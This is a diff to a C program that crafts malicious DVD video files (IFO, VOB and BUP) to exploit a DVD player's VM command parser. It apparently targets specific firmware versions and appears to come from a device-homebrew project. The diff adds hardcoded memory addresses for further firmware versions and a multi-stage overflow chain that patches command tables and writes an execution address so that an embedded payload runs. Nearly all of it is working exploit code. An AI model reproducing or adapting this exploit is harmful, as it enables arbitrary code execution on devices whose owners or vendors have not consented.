@@ -3,6 +3,17 @@
 #include <string.h>
 #include <stdlib.h>
 
+#define V302X ( \
+    defined(V302J) || \
+    defined(V302U) || \
+    defined(V302A) || \
+    defined(V302E) || \
+    defined(V302K) || \
+    defined(V302G) || \
+    defined(V302D) || \
+    defined(V302C) \
+)
+
 #define MIN(x, y) ((x) > (y) ? (y) : (x))
 #define MAX(x, y) ((x) > (y) ? (x) : (y))
 
@@ -108,7 +119,7 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
     return 0;
 }
 
-#define VOB_PATCH_LOC 0x629
+#define VOB_PATCH_1_LOC 0x644
 #define IFO_PGC_PATCH_LOC 0xcc
 #define NEW_PGC_SECT "\x00\x00\x00\x32"
 
@@ -133,24 +144,51 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
 #define JUMP_POINTER 0x0068a318
 #define CMD_DATA_ADDR 0x010f7fa8
 #define IFO_BUFFER 0x010fb800
+#elif V302E
+#define VM_CMD_PARSER_SWITCH_ADDR 0x0090c378
+#define VM_ADDR 0x015a50c0
+#define VOB_BUFFER_ADDR 0x015adac0
+#define JUMP_POINTER 0x009112c8
+#define CMD_DATA_ADDR 0x0159f030
+#define IFO_BUFFER 0x015a2880
+#elif V302C
+#define VM_CMD_PARSER_SWITCH_ADDR 0x006ee2f8
+#define VM_ADDR 0x01386fc0
+#define VOB_BUFFER_ADDR 0x0138f9c0
+#define JUMP_POINTER 0x006f31c8
+#define CMD_DATA_ADDR 0x01380f30
+#define IFO_BUFFER 0x01384780
 #endif
 
 #define CTRL_DATA_ADDR (VOB_BUFFER_ADDR + 0x0c + 0x629)
 #define VM_CMD_PARSER_SWITCH_INDEX_VAL ((JUMP_POINTER - VM_CMD_PARSER_SWITCH_ADDR) >> 2)
 #define NEEDED_LEN ((VM_ADDR - CMD_DATA_ADDR) + 24)
+#if V302X
+#define INITIAL_COPY_BUF (IFO_BUFFER + 0x104)
+#else
 #define INITIAL_COPY_BUF (IFO_BUFFER + 0x18)
+#endif
+
 #define INITIAL_COPY_BUF_TARGET (INITIAL_COPY_BUF + (NEEDED_LEN - 24))
 #define CMDT_SA (CTRL_DATA_ADDR - INITIAL_COPY_BUF_TARGET)
 #define EXEC_ADDR (CTRL_DATA_ADDR + 27)
+#if V302X
+#define NEEDED_LEN_I2 ((INITIAL_COPY_BUF_TARGET - CMD_DATA_ADDR) + 24)
+#define INITIAL_COPY_BUF_TARGET_I2 (INITIAL_COPY_BUF + (NEEDED_LEN_I2 - 24))
+
+#define NEEDED_LEN_I3 ((INITIAL_COPY_BUF_TARGET_I2 - CMD_DATA_ADDR) + 24)
+#define INITIAL_COPY_BUF_TARGET_I3 (INITIAL_COPY_BUF + (NEEDED_LEN_I3 - 24))
+
+#define VOB_PATCH_0_LOC 0x21b0
+#define IFO_CMDT_PATCH_LOC 0x10FC
+#define IFO_PGC_CAT_PATCH_LOC 0x1008
+#else
+#define VOB_PATCH_0_LOC 0x629
+#endif
 
 int main() {
     printf("CMDT_SA: %x\n", CMDT_SA);
     printf("NEEDED_LEN: %x\n", NEEDED_LEN);
-
-    if (generate_exploit_pgc("./build/fs/VIDEO_TS/VTS_02_0.BUP", CMDT_SA - 0x11e, NEEDED_LEN, EXEC_ADDR) < 0) {
-        fprintf(stderr, "Error: Failed to generate exploit PGC\n");
-        return -1;
-    }
 
     uint8_t buf[24] = {
         0x00, // VM_current_cmd_type_index
@@ -212,14 +250,14 @@ int main() {
         return -1;
     }
 
-    fseek(fp, VOB_PATCH_LOC, SEEK_SET);
+    fseek(fp, VOB_PATCH_0_LOC, SEEK_SET);
     if (fwrite(buf, 1, 24, fp) != 24) {
         fprintf(stderr, "Error: Failed to write buffer to VOB\n");
         free(payload);
         fclose(fp);
         return -1;
     }
-    fseek(fp, VOB_PATCH_LOC + 27, SEEK_SET);
+    fseek(fp, VOB_PATCH_1_LOC, SEEK_SET);
     if (fwrite(payload, 1, payload_len, fp) != payload_len) {
         fprintf(stderr, "Error: Failed to write payload to VOB\n");
         free(payload);
@@ -228,6 +266,105 @@ int main() {
     }
     free(payload);
     fclose(fp);
+#if ( \
+    defined(V302J) || \
+    defined(V302U) || \
+    defined(V302A) || \
+    defined(V302E) || \
+    defined(V302K) || \
+    defined(V302G) || \
+    defined(V302D) || \
+    defined(V302C) \
+)
+    printf("INITIAL_COPY_BUF_TARGET: %x\n", INITIAL_COPY_BUF_TARGET);
+    printf("NEEDED_LEN: %x\n", NEEDED_LEN_I2);
+    printf("INITIAL_COPY_BUF_TARGET: %x\n", INITIAL_COPY_BUF_TARGET_I2);
+    printf("NEEDED_LEN: %x\n", NEEDED_LEN_I3);
+    printf("INITIAL_COPY_BUF_TARGET: %x\n", INITIAL_COPY_BUF_TARGET_I3);
+    printf("VOB_PATCH_0_LOC: %x\n", VOB_PATCH_0_LOC);
+
+    uint8_t ifo_patch_buf[16] = {
+        0, 0, // CMDT_PRE_CNT
+        0, 0, // CMDT_POST_CNT
+        0, 0, // CMDT_CELL_CNT
+        0, 15, // CMDT_EA
+        0, 48, 0, 0, 0, 0, 0, 0 // BROKEN_CMD
+    };
+
+    uint32_t tmp = MAX(NEEDED_LEN_I3 / 8, 1);
+    ifo_patch_buf[0] = (tmp >> 8) & 0xff;
+    ifo_patch_buf[1] = tmp & 0xff;
+
+    fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
+    if (!fp) {
+        fprintf(stderr, "Error: Failed to open VTS_02_0.IFO\n");
+        return -1;
+    }
+    fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
+    
+    if (fwrite(ifo_patch_buf, 1, 6, fp) != 6) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+    fclose(fp);
+    
+    tmp = MAX(NEEDED_LEN_I2 / 8, 1);
+    ifo_patch_buf[0] = (tmp >> 8) & 0xff;
+    ifo_patch_buf[1] = tmp & 0xff;
+
+    fp = fopen("./build/fs/VIDEO_TS/VTS_03_0.IFO", "rb+");
+    if (!fp) {
+        fprintf(stderr, "Error: Failed to open VTS_03_0.IFO\n");
+        return -1;
+    }
+    fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
+    
+    if (fwrite(ifo_patch_buf, 1, 6, fp) != 6) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fclose(fp);
+
+    tmp = MAX(NEEDED_LEN / 8, 1);
+    ifo_patch_buf[0] = (tmp >> 8) & 0xff;
+    ifo_patch_buf[1] = tmp & 0xff;
+
+    fp = fopen("./build/fs/VIDEO_TS/VTS_04_0.IFO", "rb+");
+    if (!fp) {
+        fprintf(stderr, "Error: Failed to open VTS_04_0.IFO\n");
+        return -1;
+    }
+
+    fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
+    
+    if (fwrite(ifo_patch_buf, 1, 16, fp) != 16) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, IFO_PGC_CAT_PATCH_LOC, SEEK_SET);
+
+    ifo_patch_buf[0] = (EXEC_ADDR >> 24) & 0xff;
+    ifo_patch_buf[1] = (EXEC_ADDR >> 16) & 0xff;
+    ifo_patch_buf[2] = (EXEC_ADDR >> 8) & 0xff;
+    ifo_patch_buf[3] = EXEC_ADDR & 0xff;
+    
+    if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fclose(fp);
+#else
+    if (generate_exploit_pgc("./build/fs/VIDEO_TS/VTS_02_0.BUP", CMDT_SA - 0x11e, NEEDED_LEN, EXEC_ADDR) < 0) {
+        fprintf(stderr, "Error: Failed to generate exploit PGC\n");
+        return -1;
+    }
 
     fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
     if (!fp) {
@@ -241,6 +378,7 @@ int main() {
         return -1;
     }
     fclose(fp);
+#endif
 
     puts("OK");
     return 0;
